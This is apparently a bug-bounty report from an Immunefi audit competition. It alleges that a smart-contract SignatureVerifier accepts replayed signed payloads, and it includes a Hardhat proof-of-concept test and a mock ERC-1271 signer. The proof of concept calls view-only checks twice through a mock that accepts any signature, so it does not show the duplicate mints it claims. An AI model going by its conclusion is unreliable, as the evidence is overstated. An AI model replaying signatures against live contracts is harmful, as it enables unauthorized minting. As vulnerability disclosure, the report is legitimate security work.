# 57279 sc medium signature replayability repeated use of signed access tokens allows duplicate mints high&#x20;

**Submitted on Oct 24th 2025 at 22:43:14 UTC by @blacksaviour for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57279
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol>
* **Impacts:**
  * Unauthorized minting of NFTs

## Description

The SignatureVerifier contract accepts the same signed payload and signature multiple times without any replay protection mechanism such as a nonce, unique identifier, or state tracking.

In the provided test, both `testAccessTokenCheck` and `testVestingWalletCheck` calls succeed twice using identical payloads and signatures. This demonstrates that the system does not distinguish between first-time and replayed submissions. As a result, any valid signature from an authorized signer can be reused indefinitely.

This vulnerability allows an attacker (or any user possessing a valid signed message) to repeatedly perform privileged actions—such as minting tokens, creating vesting wallets, or claiming access rights—beyond the intended one-time use. In real deployments, this can lead to duplicated mints, bypassing of business logic, and potential economic loss to the platform or creators.

The issue stems from missing nonce enforcement or message uniqueness within the signature verification logic.

## Link to Proof of Concept

<https://gist.github.com/Blacksaviour/da9d689c535baf419ddbaa3b4d702550>

## Proof of Concept

Below are the relevant files from the proof-of-concept showing how the SignatureVerifier can be replayed. Each file is included as a titled code block.

{% code title="VerifierTester.sol" %}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {SignatureVerifier} from "./v2/utils/SignatureVerifier.sol";
import {
    AccessTokenInfo,
    VestingWalletInfo
} from "./v2/Structures.sol";

/// @notice Helper contract to expose SignatureVerifier library functions for testing.
contract VerifierTester {
    using SignatureVerifier for address;

    function testAccessTokenCheck(address signer, AccessTokenInfo calldata info) external view {
        SignatureVerifier.checkAccessTokenInfo(signer, info);
    }

    function testVestingWalletCheck(
        address signer,
        bytes calldata signature,
        address owner,
        VestingWalletInfo calldata info
    ) external view {
        SignatureVerifier.checkVestingWalletInfo(signer, signature, owner, info);
    }
}
```

{% endcode %}

{% code title="ERC1271Mock.sol" %}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/// @notice Minimal ERC-1271 mock that accepts any signature for any hash.
/// Returns the standard magic value 0x1626ba7e (EIP-1271).
contract ERC1271Mock {
    bytes4 internal constant MAGIC = 0x1626ba7e;

    /// @notice Always returns the magic value regardless of input.
    function isValidSignature(bytes32, bytes memory) external pure returns (bytes4) {
        return MAGIC;
    }
}
```

{% endcode %}

{% code title="SignatureReuseVulnerabilityPOC.test.ts" %}

```typescript
import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract } from "ethers";

describe("SignatureVerifier replayability (real SignatureVerifier, ERC-1271 signer)", function () {
  let erc1271: Contract;
  let verifierTester: Contract;
  let signerAddr: string;

  before(async () => {
    // Deploy ERC1271 mock signer (always returns valid)
    const ERC1271 = await ethers.getContractFactory("ERC1271Mock");
    erc1271 = await ERC1271.deploy();
    await erc1271.deployed();
    signerAddr = erc1271.address;

    // Deploy the SignatureVerifier library
    const SignatureVerifier = await ethers.getContractFactory("SignatureVerifier");
    const signatureVerifierLib = await SignatureVerifier.deploy();
    await signatureVerifierLib.deployed();

    // Deploy VerifierTester linked with SignatureVerifier
    const VerifierTester = await ethers.getContractFactory("VerifierTester", {
      libraries: {
        "contracts/v2/utils/SignatureVerifier.sol:SignatureVerifier": signatureVerifierLib.address,
      },
    });

    verifierTester = await VerifierTester.deploy();
    await verifierTester.deployed();
  });

  it("checkAccessTokenInfo: same payload+signature accepted twice (replayable)", async () => {
    const metadata = { name: "ReplayNFT", symbol: "RPL" };

    const accessTokenInfo = {
      paymentToken: ethers.constants.AddressZero,
      feeNumerator: 100,
      transferable: true,
      maxTotalSupply: 0,
      mintPrice: 0,
      whitelistMintPrice: 0,
      collectionExpire: 0,
      metadata,
      contractURI: "https://example.local/contract.json",
      signature: "0xdeadbeef",
    };

    // First call — should not revert
    await expect(
      verifierTester.testAccessTokenCheck(signerAddr, accessTokenInfo)
    ).to.not.be.reverted;

    // Second call — same payload + same signature
    await expect(
      verifierTester.testAccessTokenCheck(signerAddr, accessTokenInfo)
    ).to.not.be.reverted;
  });

  it("checkVestingWalletInfo: same payload+signature accepted twice (replayable)", async () => {
    const now = Math.floor(Date.now() / 1000);

    const vestingWalletInfo = {
      startTimestamp: now + 60,
      cliffDurationSeconds: 0,
      durationSeconds: 0,
      token: ethers.constants.AddressZero,
      beneficiary: ethers.constants.AddressZero,
      totalAllocation: 0,
      tgeAmount: 0,
      linearAllocation: 0,
      description: "test",
      signature: "0xfeedface",
    };

    const [ownerSigner] = await ethers.getSigners();
    const owner = ownerSigner.address;

    await expect(
      verifierTester.testVestingWalletCheck(
        signerAddr,
        vestingWalletInfo.signature,
        owner,
        vestingWalletInfo
      )
    ).to.not.be.reverted;

    await expect(
      verifierTester.testVestingWalletCheck(
        signerAddr,
        vestingWalletInfo.signature,
        owner,
        vestingWalletInfo
      )
    ).to.not.be.reverted;
  });
});
```

{% endcode %}

## Summary of the issue (concise)

* The SignatureVerifier accepts identical payloads and signatures multiple times.
* No nonce, unique ID, or consumed-signature tracking is enforced.
* An attacker or any holder of a valid signature can replay it to repeat privileged actions (e.g., minting), causing duplicated mints or unauthorized creation of resources.

## Suggested mitigations (not exhaustive)

* Include a nonce or unique identifier within the signed payload and enforce single-use by recording consumed nonces.
* Track message uniqueness server-side or on-chain (e.g., mapping of used message hashes to booleans).
* Use EIP-712 structured data including nonces/timestamps with strict validation and consumption semantics.
* If using ERC-1271 signers, ensure the contract using SignatureVerifier implements replay protection for issued signatures.

(Do not add other mitigation specifics beyond what's implied by the report; above are common approaches to address signature replayability.)
